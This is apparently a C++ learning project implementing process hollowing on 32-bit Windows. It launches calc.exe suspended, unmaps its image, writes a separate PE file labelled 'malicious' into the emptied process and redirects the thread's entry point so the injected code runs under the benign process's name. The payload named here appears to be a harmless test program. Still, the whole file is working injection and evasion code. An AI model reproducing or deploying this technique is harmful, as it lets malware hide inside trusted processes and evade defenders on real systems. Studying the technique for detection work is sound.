#include <iostream>
#include <Windows.h>
using namespace std;

// define function ZwUnmapViewOfSection
typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);


int main() {
	LPSTARTUPINFOA dest_si = new STARTUPINFOA();
	LPPROCESS_INFORMATION dest_pi = new PROCESS_INFORMATION();
	CONTEXT contxt;

	// Create Benign process to hollow
	// dwCreationFlags: (CREATE_SUSPENDED = 0x4)
	if (!CreateProcessA(
		(LPSTR)"C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, TRUE, 0x4, NULL,
		NULL, dest_si, dest_pi))
	{
		cout << "[-] Failed to create target process to hollow!!\n";
		return 1;
	}

	// Create a handle to a Maicious program file that will run inside the target process
	HANDLE hMalPro = CreateFileA(
		(LPCSTR)"C:\\Users\\DuongLucky\\Desktop\\MessageBox\\Debug\\MessageBox.exe",
		GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);

	if (hMalPro == INVALID_HANDLE_VALUE)
	{
		cout << "[-] Error creating File: " << GetLastError() << endl;
		return 1;
	}
	
	cout << "[+] Benign process ID: " << dest_pi->dwProcessId << endl;
	cout << "[+] Creating Benign process and Malicious file successfully!\n";

	// Get size of Malicious file for allocating memory
	DWORD sizeMal = GetFileSize(hMalPro, NULL);
	cout << "[+] Size of Malicious file: " << sizeMal << " bytes.\n";

	// ##########################################################
	// ##########################################################
	// Allocating memory for Malicious file
	// DWORD flProtect = 0x40 (PAGE_EXECUTE_READWRITE)
	PVOID allocateMalMemory = VirtualAlloc(NULL, sizeMal, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (allocateMalMemory == NULL)
	{
		cout << "[-] Can't allocate Malicious file: " << GetLastError() << endl;
		TerminateProcess(dest_pi->hProcess, NULL);
		return 1;
	}

	cout << "[+] Allocated Malicious file at: 0x" << allocateMalMemory << endl;

	DWORD numOfBytesRead;
	// Read the content of Malicious file and write into the allocated memory
	if (ReadFile(hMalPro, allocateMalMemory, sizeMal, &numOfBytesRead, NULL) == 0)
	{
		cout << "[-] Failed to read or write malicious code " << GetLastError() << endl;
		TerminateProcess(dest_pi->hProcess, 0);
		return 1;
	}
	
	cout << "[+] Succesfully wrote Malicious code to memory.\n";
	
	CloseHandle(hMalPro);
	
	// Get the address of Entry Point Memory and Process Environment Block (PEB) through EAX and EBX register
	// get ImageBaseAddress with (value of EBX register + 0x8).
	contxt.ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(dest_pi->hThread, &contxt);
	
	// Saved the context of benign process to the a pointer to buffer
	PVOID pDestImageBaseAddr;
	ReadProcessMemory(dest_pi->hProcess, (PVOID)(contxt.Ebx + 8), &pDestImageBaseAddr, sizeof(PVOID), 0);

	cout << "[+] Target's image base address: 0x" << pDestImageBaseAddr << endl;
	
	// ##########################################################
	// ##########################################################
	// Process Hollowing
	HMODULE NtdllBase = GetModuleHandleA("ntdll.dll");
	pfnZwUnmapViewOfSection unmapping = (pfnZwUnmapViewOfSection)GetProcAddress(NtdllBase, 
		"ZwUnmapViewOfSection");

	DWORD unmapResult = unmapping(dest_pi->hProcess, pDestImageBaseAddr);
	if (unmapResult) {
		cout << "[-] Unmapping failed!" << endl;
		TerminateProcess(dest_pi->hProcess, 0);
		return 1;
	}

	cout << "[+] Succesfully unmmapping target Image at: 0x" << pDestImageBaseAddr << endl;

	// Get the Mal code in allocated memory
	// Malicious's NT Header
	PIMAGE_DOS_HEADER malDOSHeader = (PIMAGE_DOS_HEADER)allocateMalMemory;
	PIMAGE_NT_HEADERS malNTHeader = (PIMAGE_NT_HEADERS)((DWORD)allocateMalMemory + malDOSHeader->e_lfanew);		// e_lfanew field contains address of RVA
	
	DWORD sizeofMalImage = malNTHeader->OptionalHeader.SizeOfImage;

	cout << "[+] Malicious Image Base Address: 0x" << malNTHeader->OptionalHeader.ImageBase << endl;

	// Allocating in the target process
	PVOID hollowAddr = VirtualAllocEx(dest_pi->hProcess, pDestImageBaseAddr, sizeofMalImage, 
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (hollowAddr == NULL)
	{
		cout << "[-] Failed to allocate in the target process: " << GetLastError() << endl;
		TerminateProcess(dest_pi->hProcess, 1);
		return 1;
	}

	cout << "[+] Successfully allocated in target image at 0x:" << hollowAddr << endl;

	// Write PE Header of Mal to target
	if (WriteProcessMemory(dest_pi->hProcess, pDestImageBaseAddr, allocateMalMemory,
		malNTHeader->OptionalHeader.SizeOfHeaders, NULL) == 0)
	{
		cout << "[-] Failed to write malicious code to target process: " << GetLastError() << endl;
		TerminateProcess(dest_pi->hProcess, 1);
		return 1;
	}

	cout << "[+] Succesfully write header to target." << endl;
	
	// Write sections to target
	for (int i = 0; i < malNTHeader->FileHeader.NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER hollowedSection = (PIMAGE_SECTION_HEADER)((DWORD)malNTHeader + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

		WriteProcessMemory(dest_pi->hProcess, (PVOID)((DWORD)hollowAddr + hollowedSection->VirtualAddress),
			(PVOID)((DWORD)allocateMalMemory + hollowedSection->PointerToRawData), 
				hollowedSection->SizeOfRawData, NULL);
		cout << "[+] Succesffully wrote section " << hollowedSection->Name << " to target..." << endl;
	}
	cout << "[+] Writing all sections succesfully" << endl;
	
	// Change victim Entry Point (EAX thread context) to malicious code 's entry point and resume thread
	contxt.Eax = (SIZE_T)((LPBYTE)hollowAddr + malNTHeader->OptionalHeader.AddressOfEntryPoint);
	SetThreadContext(dest_pi->hThread, &contxt);
	ResumeThread(dest_pi->hThread);

	system("pause");
	TerminateProcess(dest_pi->hProcess, 0);
	return 0;
}